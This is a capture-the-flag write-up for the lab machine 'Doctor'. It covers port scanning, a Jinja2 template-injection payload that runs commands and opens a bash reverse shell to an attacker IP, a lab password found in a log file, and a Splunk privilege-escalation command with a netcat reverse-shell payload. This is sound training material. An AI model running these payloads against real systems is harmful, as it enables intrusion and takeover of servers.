## Doctor

Difficulty: Easy

### User Flag

#### Foothold

```
rustscan -a 10.10.10.209 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/4cd4f0bb-2294-435e-b1ae-fcba70ad242b)

<br>

Inside the website, we enumerate the domain "doctors.htb".

![infoDoctors](https://github.com/b1d0ws/OSCP/assets/58514930/53d242af-ece3-4fb3-b143-fa438778277a)

<br>

On doctors, you can create posts. The title field is vulnerable to SSTI, but it only reflects the result on /archive.

Archive page can be founded through directory enumeration or in the source code of the main page.

![doctors](https://github.com/b1d0ws/OSCP/assets/58514930/ad5893f6-52c9-4712-86b9-02b84511c1a7)

![newPost](https://github.com/b1d0ws/OSCP/assets/58514930/08c58e55-e334-44ad-aae2-76608386b4d4)

![posts](https://github.com/b1d0ws/OSCP/assets/58514930/8543be95-98bf-47bd-b6db-3b1a2d022888)

![archiveSourceCode](https://github.com/b1d0ws/OSCP/assets/58514930/59e577bd-70c6-44d4-9ab4-5c747794f63e)

![archiveSSTI](https://github.com/b1d0ws/OSCP/assets/58514930/88de7415-ca3a-4b42-9509-2a29919bdb1b)

<br>

You can perform RCE with this vulnerability.

```python
# id
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# reverse shell
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.11/3333 0>&1'").read() }}
```

![archiveId](https://github.com/b1d0ws/OSCP/assets/58514930/2020986e-f6d2-47fa-bcfd-c666ce85fb12)

![rceSSTI](https://github.com/b1d0ws/OSCP/assets/58514930/8933f67f-ff86-4b42-92c3-eaf6d14bc042)

#### User Access

Running linpeas, we enumerate a password in a log file that can be used to login as shaun.

Since our user belongs to "adm" group, we can read logs. The information below is inside /var/logs/apache2/backup, an uncommon log file.

![shaunPassword](https://github.com/b1d0ws/OSCP/assets/58514930/b6dd543f-7031-4bad-b5ff-e48944b75185)

### Root Flag

You can login into splunk with shaun credentials.

![splunkLogin](https://github.com/b1d0ws/OSCP/assets/58514930/c53cac6d-8098-4821-b6a8-86a1fa5fbf98)

<br>

Searching for splunk exploits, we discover a local privilege escalation.

```bash
python3 PySplunkWhisperer2_local_python3.py --username shaun --password Guitar123 --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.11 3333 >/tmp/f"
```

![splunkExploitSearch](https://github.com/b1d0ws/OSCP/assets/58514930/1671969e-58ad-458b-ace0-38c4dee6a21e)

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/27d8820c-bda3-47c1-85f1-a56e291abe03)
